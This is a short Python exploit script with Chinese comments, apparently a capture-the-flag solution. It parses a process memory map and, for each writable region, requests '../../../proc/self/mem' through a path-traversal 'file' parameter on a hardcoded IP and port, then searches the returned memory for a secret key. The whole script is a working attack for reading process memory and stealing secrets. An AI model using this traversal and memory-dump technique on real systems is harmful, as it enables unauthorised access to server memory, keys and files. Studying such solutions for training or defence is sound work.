import re
import requests

maps=open('./test.txt')
b = maps.read()
list = b.split('\\n')
for line in list:
    if 'rw' in line:
        addr = re.search('([0-9a-f]+)-([0-9a-f]+)',line)
        #正则匹配地址,地址格式为十六进制数[0-9a-f],reserch会返回一个re.Match对象，用括号括起来是为了使用group()处理返回结果。
        start = int(addr.group(1),16)  #将十六进制字符转化为十进制数，为了符合start参数格式参考链接
        end = int(addr.group(2),16)    #将十六进制字符转化为十进制数，为了符合end参数格式
        print(start,end)
        url = f"http://61.147.171.105:61596/info?file=../../../proc/self/mem&start={start}&end={end}"
        #使用start和end参数读取mem
        response = requests.get(url)
        secret_key = re.findall("[a-z0-9]{32}\*abcdefgh", response.text)  #uuid4()生成的字符串除去-符号后为固定的32字节（128bit），find
        if secret_key:
            print(secret_key)
            break